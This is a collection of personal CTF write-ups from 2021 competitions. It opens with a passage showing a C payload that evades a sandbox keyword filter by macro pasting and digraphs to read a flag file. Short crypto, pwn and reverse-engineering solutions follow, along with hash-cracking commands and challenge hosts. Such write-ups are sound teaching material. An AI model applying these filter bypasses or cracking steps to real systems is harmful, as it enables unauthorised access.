By inspecting the source code of the page we learn that the flag can be found in a text file on the servers root directory. A quick look at the linked javascript also reveals that error responses, when received from the server, are alerted. That's how to possibly leak information from the server - and indeed, when writing to _stderr_ and exiting the program with an error, we are presented with the error output in the alert.

So, my idea was to just open the _/flag.txt_, read its content, print it to _stderr_ and then exit the main function with an error to report the information back. But, obviously some source code filter gets applied and I got notified that the _dangerous keyword 'fopen' has been detected_ and my code therefore wouldn't run. After trying a few other approaches I quickly realized most of the interesting functions found in _stdio.h_ were prohibited.

I then tried to close the main function early with a ```}``` and ```#include "/flag.txt"``` afterwards, provoking a compilation error leaking the contents of the file in the error output. But again, no luck - ```include``` as well as the ```#```-symbol were considered dangerous, too.

## Solution
My final solution was to bypass the source code filter by inserting the dangerous functions at compile time. The key here was to use macros and let the preprocessor concatenate the dangerous function names with the ```##```-directive. To deal with the prohibition of the ```#```-symbol itself, I used [digraphs](https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C).

##### payload:
```C
    leak_flag();
    return 1;
}

%:define OPEN(path, mode) fop%:%:en(path, mode)
%:define SCAN(f, fmt, buf) fsca%:%:nf(f, fmt, buf)

int leak_flag() {
    char buf[128];
    FILE *f;
    f = OPEN("/flag.txt", "r");
    SCAN(f, "%s", buf);
    fprintf(stderr, buf);
```

##### flag:
```
SCTF{take-care-when-execute-unknown-code}
```



### File: writeups/README.md

# writeups
personal writeups from CTF challenges 



### File: writeups/crypto/Boombastic/README.md

`2021` `Fword CTF` `crypto` `signature` `forgery`  

# Boombastic
[boombastic.py](./boombastic.py)  

A pen and a paper, thats's all you need to watch the movie.

nc 52.149.135.130 4872

___

The ticket generation function in use derives a ticket `T = {r,s,p}` from a message `M` by calculating  
```
r = (y^2-1) (x^2 )^(-1)     (mod p)
s = (y+1) x^(-1)            (mod p)
```
where  
- `p` is a random prime
- `x ∈ Z_p` is a random secret 
- `y` is the numerical representation of `M` obtained by its SHA256 hash value

We are also given an encryption oracle from which we can obtain random tickets generated by the program.  

The weakness here is that the same secret `x` is being re-used in all tickets. For we know all the other parameters involved in ticket generation, if we know `x`, we can forge any ticket - as it's the same in every ticket. Thus, given the encryption oracle we obtain a random ticket `T = {r,s,p}` and derive `x` as follows:  
```
s = (y+1) x^(-1)                (mod p)

=> x^(-1) = s/(y+1)             (mod p) // (1)
=> x = (s/(y+1)^(-1)            (mod p) // (2)

r = (y^2-1) (x^2 )^(-1)         (mod p)
  = (y^2-1) x^(-1) x^(-1)       (mod p) // substitute with (1)
  = (y^2-1) (s/(y+1))^2         (mod p)

=> y = (-s^2-r) (r-s^2)^(-1)    (mod p) // (3)

substitute (2) with (3)
```

A last quick look into the [source](boombastic.py) tells us the message `M` to be used for the VIP ticket is *Boombastic*.  

Now we have all we need to craft us some VIP ticket by ourselves and enter the cinema!

See [exploit](exploit.py) for an implementation.

> Here is your flag : FwordCTF{4ct_l1k3_a_V1P_4nd_b3c0m3_a_V1P}, enjoy the movie sir



### File: writeups/crypto/Break me!/README.md

`2021` `DownUnder CTF` `crypto` `aes` `ecb` `chosen plaintext attack`

# Break me!
[aes-ecb.py](./aes-ecb.py)  

AES encryption challenge.

`nc pwn-2021.duc.tf 31914`
___

We are faced with an [AES-ECB](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) encryption oracle here which - given some plaintext _**P**_ - encrypts

```
flag + P + k + padding
```

where _**k**_ is the secret key used in the encryption scheme.

Because we control _**P**_, we can leak the key bytes one-after-another by leveraging a [well-known](https://crypto.stackexchange.com/a/46921) chosen plaintext/brute-force attack. As soon as the key is reconstructed it can then be used to
decrypt the first blocks independently resulting in our flag. For this particular challenge, key memoization and a reconnection mechanism had to be implemented as the remote host did from time to time just close the connection. But, I was too lazy for that and just manually updated the leaked key bytes I had so far, starting over again from that point.

See [exploit](./exploit.py) for an implementation of the attack written in python.

> DUCTF{ECB_M0DE_K3YP4D_D474_L34k}}



### File: writeups/crypto/Common Mistake/README.md

`2021` `HTB Cyber Santa is Coming to Town` `crypto` `rsa` `common modulus attack`  

# Common Mistake
[encrypted.txt](./encrypted.txt)

Elves are trying very hard to communicate in perfect secrecy in order to keep Santa's warehouse.
Unfortunately, their lack of knowledge about cryptography leads them to common mistakes.
___



### File: writeups/crypto/Crypto Warm up/README.md

`2021` `ASIS CTF Quals` `crypto` `warmup` `permutation` `modular arithmetic`  

# Crypto Warm up
[Warmup.py](./Warmup.py) | [output.txt](./output.txt)  

Recovering secrets is hard, but there are always some easy parts to do it!
___



### File: writeups/crypto/Deoxyencoded Nucleic Acid/README.md

`2021` `Killer Queen CTF` `crypto` `dna`

# Deoxyencoded Nucleic Acid
[dna1.txt](./dna1.txt)  
___

The challenge description was emphasizing that the _four_ nucleobases form an encoding. I recognized that the length of the dna sequence is 0 mod 4 and took an educated guess that a sequence of _four_ nucleobases encodes a character. As a character has 1 Byte I predicted `A`, `G`, `C` and `T` each could represent two bits. I know the flag starts with the letter `k` whose ordinal value is binary `01 10 10 11` and the dna sequence starts with `TGGC` - which matches

- `T` with `01`
- `G` with `10`
- `C` with `11`

just perfectly, leaving `A` to represent `00`.

Interpreting each quadrupel of nucleobases as the ordinal value of a character by concatenation of their binary values yields the flag.

See [solve](./solve.py) for an implementation in python.

> kqctf{its_basica11y_base_four}



### File: writeups/crypto/Honeycomb/README.md

`2021` `K3RN3L CTF` `crypto` `streamcipher` `keystream recovery`  

# Honeycomb
[honeycomb.py](./honeycomb.py)  
___



### File: writeups/crypto/Madras/README.md

`2021` `ASIS CTF Quals` `crypto` `multi-prime RSA`

# Madras
[Madras.py](./Madras.py) | [output.txt](./output.txt)  

Madras is a great place to learn the occult! The occult, is a category of supernatural beliefs and practices which generally fall outside the scope of religion and science. Do you want to go Madras?
___



### File: writeups/crypto/Meet Me Halfway/README.md

`2021` `HTB Cyber Santa is Coming to Town` `crypto` `aes` `ecb` `meet-in-the-middle attack`  

# Meet Me Halfway
[challenge.py](./challenge.py)

Evil elves have deployed their own cryptographic service. The keys are unknown to everyone but them. Fortunately, their encryption algorithm is vulnerable.
Could you help Santa break the encryption and read their secret message?
___



### File: writeups/crypto/Missing Reindeer/README.md

`2021` `HTB Cyber Santa is Coming to Town` `crypto` `rsa` `small exponent attack`

# Missing Reindeer
[message.eml](./message.eml)

Not only elves took control of Santa's Christmas factory but they kidnapped Rudolf as well.
Our cyber spies managed to capture an email related to Santa's favorite reindeer. Can you
help them decrypt the message?
__

1. Extract [public key](./key.pub) and [secret message](./secret.enc) from [email](./message.eml).
2. Parse public key with `openssl rsa -in key.pub -noout -text -pubin`
3. Parse secret with `cat secret.enc | base64 -d | xxd -p | tr -d '\n'`
4. [solve](./solve.py)



### File: writeups/crypto/N1TP/README.md

`2021` `H@cktivityCon CTF` `crypto` `one-time pad`
# N1TP

Nina found some new encryption scheme that she apparently thinks is really cool. She's annoying but she found a flag or something, can you deal with her?
___

You were given an encrypted flag and an encryption oracle. From the context of the challenge one can deduce the applied encryption scheme here is a [One-Time Pad](https://en.wikipedia.org/wiki/One-time_pad). A OTP is cryptographically secure unless being re-used. If so, given an encryption oracle and a ciphertext `C = M ^ K` where `K` is the OTP , one can recover the original message `M` by simply calculating `C1 = M1 ^ K` and then:  

```
C ^ C1 ^ M1 = M ^ K ^ M1 ^ K ^ M1 = M
```

I fetched the encrypted flag and the ciphertext for the plaintext I provided and predicted that the OTP would be re-used. Applying the aforementioned formula proved me right and rewarded me with the flag.

> flag{9276cdb76a3dd6b1f523209cd9cd9c0a11b}

##### Edit
I learned after the event that because we know the original message starts with the word `flag{` I could have chosen a plaintext for the oracle starting with the same word to learn that the OTP is being re-used here - the first bytes of the two ciphertexts are then equal and therefore the OTP is re-used.



### File: writeups/crypto/RSA - 1/README.md

`2021` `DeconstruCT.F` `crypto` `rsa` `prime factorization`  

# RSA - 1
[big_numbers.txt](./big_numbers.txt)  

I have a lot of big numbers. Here, have a few!
___

Obviously, this is a RSA challenge and despite they are calling them big_numbers, those numbers aren't _that_ big. Therefore, `n` can be factored out with reasonable efforts. Someone already did the factorization of `n` and so I was able to fetch the corresponding `p` and `q` from [factordb](http://factordb.com/). From that point I just
followed basic schoolbook RSA algorithm to derive `d` and decrypt `c`.

See [exploit](./exploit.py) for an implementation in python.

> dsc{t00_much_m4th_8898}




### File: writeups/crypto/RSA - 2/README.md

`2021` `DeconstruCT.F` `crypto` `rsa` `small exponent attack`  

# RSA - 2
[supercomputer_food](./supercomputer_food)  

Hey I heard you have a supercomputer at home. This is taking too long to compute on my computer. Could you take a look on yours?
I'm sure its a lot more precise than mine is, and faster too!
___

The numbers are obviously from the [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) encryption scheme. What immediately catches the eye here is the
very small value for `e`. Also, `c` is relatively small compared to `n`. So there's a chance that `m^e = c < n` and if no padding is used then the original message
can be recovered by just reversing the operation with `m = c^(1/e)`.

See [exploit](./exploit.py) for an implementation in python.

> dsc{t0-m355-w1th-m4th-t4k35-4-l0t-0f-sp1n3}



### File: writeups/crypto/RSA - 3/README.md

`2021` `DeconstruCT.F` `crypto` `rsa` `wiener attack`  

# RSA - 3
[mykey.pub](./mykey.pub)  

Alright, this is the big leagues. You have someone's Public Key. This isn't unusual, if you want to send someone an encrypted message, you have to have thier public key.
Your job is to evaluate this public key, and obtain the value of the secret exponent or decryption exponent (The value of "d" in an RSA encryption).

Wrap the number that you find with dsc{<number>}!
___

I first extracted the [public key](./mykey.pub) with `openssl rsa -in mykey.pub -noout -text -pubin`. Looking at a _very_ big `e` I took an educated guess that maybe `d` would be sufficently small (namely `d < 1/3n^(1/4)`), which could then be exploited by leveraging [Wiener's Attack](https://en.wikipedia.org/wiki/Wiener%27s_attack).

Using Wiener's Attack based on continued fractions and their convergents I was able to recover `d` from the public key.

See [exploit](./exploit.py) for an implementation in python.

> dsc{6393313697836242618414301946448995659516429576261871356767102021920538052481829568588047189447471873340140537810769433878383029164089236876209147584435733}



### File: writeups/crypto/Result/README.md

`2021` `CyberSecurityRumble CTF` `crypto` `hash` `md5` `brute-force`  

# Result
[Test_Result.eml](./Test_Result.eml)

I really want to know my test result, but unfortunately its additionally protected. I attached the email. Maybe you can help?
___

The PDF attached in the email is password protected with a german postal code.

1. Generate a wordlist with possible german postal codes with `crunch 5 5 0123456789 > wordlist`
2. Extract the password hash from the PDF with `pdf2hashcat result.pdf > hash`
3. Crack the hash with `hashcat -m 10700 -a 0 wordlist hash` yielding `73760`



### File: writeups/crypto/Substitution Cipher I/README.md

`2021` `DownUnder CTF` `crypto` `substitution`

# Substitution Cipher I
[substitution-cipher-i.sage](substitution-cipher-i.sage) | [output.txt](output.txt)  

Just a simple substitution cipher to get started...
___

The encryption scheme found in the source is a trivial substitution cipher based on the polynomial

```
13x^2 + 3x + 7
```

where `x` is substituted by each plaintext byte and the solution of the resulting mathematical expression is the corresponding
ciphertext byte interpreted as a unicode character. Therefore, decrypting a ciphertext byte `y` is as easy as solving the
quadratic equation

```
13x^2 + 3x + 7 = y
```

I solved the quadratic equation for each ciphertext byte after `x` using the quadratic formula `(-b + sqrt(b^2 - 4ac)) / 2a`
ignoring all the negative solutions as I know the plaintext consisted of only positive byte values.  

See [exploit](./exploit.py) for an implementation written in python.

> DUCTF{sh0uld'v3_us3d_r0t_13}



### File: writeups/crypto/XMAS Spirit/README.md

`2021` `HTB Cyber Santa is Coming to Town` `crypto` `substitution`  

# XMAS Spirit
[challenge.py](./challenge.py) | [encrypted.bin](./encrypted.bin)

Now that elves have taken over Santa has lost so many letters from kids all over the world.
However, there is one kid who managed to locate Santa and sent him a letter. It seems like
the XMAS spirit is so strong within this kid. He was so smart that thought of encrypting the
letter in case elves captured it. Unfortunately, Santa has no idea about cryptography.
Can you help him read the letter?
___



### File: writeups/crypto/xorpals/README.md

`2021` `Dam CTF` `crypto` `xor`  

# xorpals
[flags.txt](./flags.txt)

One of the 60-character strings in the provided file has been encrypted by single-character XOR. The challenge is to find it, as that is the flag.

Hint: Always operate on raw bytes, never on encoded strings. Flag must be submitted as UTF8 string.
___



### File: writeups/pwn/Flag Checker Baby/README.md

`2021` `CyberSecurityRumble CTF` `pwn` `bof` `strncpy` `null-termination`  

# Flag Checker, Baby
[chall.c](./chall.c)

This program is perfectly safe, right? It only tells you what you already know. Check your flags:

nc challs.rumble.host 53921
___

As `strncpy` doesn't guarantee NULL-termination, sending a non NULL-terminated string of max buffer length causes `printf` to read further characters after where the `guess`
buffer resides on the stack - where `flag` is stored.

`ruby -e 'puts "A"*31' | nc challs.rumble.host 53921`



### File: writeups/pwn/Minimelfistic/README.md

`2021` `HTB Cyber Santa is Coming to Town` `pwn` `bof` `rop` `ret2libc` `ret2csu`  

# Minimelfistic
[minimelfistic](./minimelfistic) | [libc.so.6](./libc.so.6)

The Elves finally understood what went wrong with all their plans. They were too fancy and obvious!
But, this one is different.. It's a security system, but the alarm rings whenever Santa's house is
vulnerable to an attack. Will you manage to deactivate it? p.s. Sound on!
___



### File: writeups/pwn/Mr Snowy/README.md

`2021` `HTB Cyber Santa is Coming to Town` `pwn` `bof` `ret2win`  

# Mr. Snowy
[mr_snowy](./mr_snowy)

There is ❄️ snow everywhere!! Kids are playing around, everything looks amazing.
But, this ☃️ snowman... it scares me..
He is always 👀 staring at Santa's house. Something must be wrong with him.
___



### File: writeups/pwn/Naughty List/README.md

`2021` `HTB Cyber Santa is Coming to Town` `pwn` `bof` `ret2libc`  

# Naughty List
[libc.so.6](./libc.so.6) | [naughty_list](./naughty_list)

The Elves have stolen Santa's 📜 and now he does not know who was good and who was bad.
This form will help him recreate his list and send out gifts. Were you good enough or naughty?
___



### File: writeups/pwn/Sleigh/README.md

`2021` `HTB Cyber Santa is Coming to Town` `pwn` `bof` `shellcode` `nop-sled`  

# Sleigh
[sleigh](./sleigh)

The Elves have messed up with Santa's sleigh! Without it, he will not be able to deliver any gifts!!
Help him repair it and save the holidays!
___



### File: writeups/pwn/badseed/README.md

`2021` `K3RN3L CTF` `pwn` `quiz` `rand`  

# badseed
[badseed](./badseed)

learn how to intract with a process and solve the quiz.

nc ctf.k3rn3l4rmy.com 2200
___



### File: writeups/rev/Giftwrap/README.md

`2021` `HTB Cyber Santa is Coming to Town` `rev` `upx` `xor`  

# Gift Wrapping
[giftwrap](./giftwrap)

The elves won't let you into their secret hideout without the password.
Luckily, they've given it to you as a gift! But it seems to be wrapped up tight...
___

1. Execute `strings` on binary to detect it is packed.
2. Unpack binary with `upx -d giftwrap`
3. Reverse `main`

	```C
	char input[256];
	scanf("%256s", &input);

	for (int i = 0; i < 256; i++) {
		input[i] ^= 0xf3
	}

	char check = [
	    0xbb, 0xa7, 0xb1, 0x88, 0x86, 0x83, 0x8b, 0xac,
	    0xc7, 0xc2, 0x9d, 0x87, 0xac, 0xc6, 0xc3, 0xac,
	    0x9b, 0xc7, 0x81, 0x97, 0xd2, 0xd2, 0x8e, 0x00
	];

	assert(check == input)
	```
4. [solve](./solve.py)



### File: writeups/rev/seed/README.md

`2021` `Dam CTF` `rev` `prng` `seed`  

# seed
[seed.py](./seed.py) | [log.txt](./log.txt)  

Having a non-weak seed when generating "random" numbers is super important! Can you figure out what is wrong with this PRNG implementation?

`seed.py` is the Python script used to generate the flag for this challenge. `log.txt` is the output from the script when the flag was generated.

What is the flag?
___



### File: writeups/2021/ALLES! CTF/Pyimplant/CHALLENGE.md

Our company just developed an awesome python TicTacToe game. Before shipping, it was compiled to bytecode to minimize size and enable a faster download all over the world. However, in the recent days we found a version of our bytecode online, which produces another sha256sum as our original one, but it still works properly and has all our fancy features!? What did they manipulate? Can you find any implants?

You'll find the source code and the manipulated version attached in the ZIP file.



### File: writeups/2021/FwordCTF/Boombastic/CHALLENGE.md

A pen and a paper, thats's all you need to watch the movie.

nc 52.149.135.130 4872 



### File: writeups/2021/FwordCTF/devprivops/CHALLENGE.md

Well good luck elevating your privs x)  

ssh -p 10000 ctf@devprivops.fword.tech  
Password: FwOrDAndKahl4FTW



### File: writeups/2021/HacktivityCon CTF/Hexahedron/CHALLENGE.md

So much of crypto is all about shapes! Since some shapes have so many special sides :)



### File: writeups/2021/HacktivityCon CTF/N1TP/CHALLENGE.md

Nina found some new encryption scheme that she apparently thinks is really cool. She's annoying but she found a flag or something, can you deal with her?

nc challenge.ctf.games 31921



### File: writeups/2021/SSTF/SW Expert Academy/CHALLENGE.md

Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!

Server 1: http://swexpertacademy.sstf.site/  
Server 2: http://swexpertacademy2.sstf.site/



### File: writeups/crypto/Boombastic/CHALLENGE.md

A pen and a paper, thats's all you need to watch the movie.

nc 52.149.135.130 4872 



### File: writeups/crypto/N1TP/CHALLENGE.md

Nina found some new encryption scheme that she apparently thinks is really cool. She's annoying but she found a flag or something, can you deal with her?

nc challenge.ctf.games 31921

